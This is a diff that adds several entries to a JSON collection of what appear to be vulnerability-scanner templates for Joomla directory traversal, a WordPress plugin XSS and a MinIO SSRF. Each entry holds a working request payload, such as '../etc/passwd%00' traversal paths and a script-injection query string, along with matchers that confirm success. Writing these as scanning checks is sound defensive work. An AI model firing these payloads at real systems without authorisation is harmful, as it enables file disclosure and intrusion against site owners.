@@ -1164,6 +1164,43 @@
       ]
     },
     {
+      "id": "CVE-2010-1352",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the JOOFORGE Jutebox (com_jukebox) component 1.0 and 1.7 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Juke Box 1.7 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12084",
+          "https://www.cvedetails.com/cve/CVE-2010-1352"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jukebox&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-1353",
       "info": {
         "author": "daffainfo",
@@ -2195,6 +2232,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/index.php?option=com_properties&controller=../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1952",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the BeeHeard (com_beeheard) and BeeHeard Lite (com_beeheardlite) component 1.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component BeeHeard 1.0 - Local File Inclusion",
+        "reference": [
+          "https://www.exploit-db.com/exploits/12239",
+          "https://www.cvedetails.com/cve/CVE-2010-1952"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_beeheard&controller=../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -5368,6 +5442,51 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/dzs-videogallery/deploy/designer/preview.php?swfloc=%22%3E%3Cscript%3Ealert(1)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-9444",
+      "info": {
+        "author": "daffainfo",
+        "description": "The Frontend Uploader WordPress plugin was affected by an Unauthenticated Cross-Site Scripting (XSS) security vulnerability.",
+        "name": "Frontend Uploader <= 0.9.2 - Unauthenticated Cross-Site Scripting (XSS)",
+        "reference": [
+          "https://wpscan.com/vulnerability/f0739b1e-22dc-4ca6-ad83-a0e80228e3c7",
+          "https://nvd.nist.gov/vuln/detail/CVE-2014-9444"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2014,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?page_id=0&&errors[fu-disallowed-mime-type][0][name]=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -25819,6 +25938,50 @@
             "{{BaseURL}}/log/view?filename=/windows/win.ini&base=../../../../../../../../../../",
             "{{BaseURL}}/manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../",
             "{{BaseURL}}/log/view?filename=/etc/passwd&base=../../../../../../../../../../"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-21287",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-21287",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N",
+          "cvss-score": 7.7,
+          "cwe-id": "CWE-918"
+        },
+        "description": "MinIO is a High Performance Object Storage released under Apache License v2.0. In MinIO before version RELEASE.2021-01-30T00-20-58Z there is a server-side request forgery vulnerability.",
+        "name": "MinIO Browser API SSRF",
+        "reference": [
+          "https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q",
+          "https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-21287"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2021,minio,ssrf,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "We encountered an internal error"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /minio/webrpc HTTP/1.1\nHost: {{interactsh-url}}\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36\nContent-Length: 76\n\n{\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\":  \"Test\"},\"method\":\"web.LoginSTS\"}\n"
           ]
         }
       ]
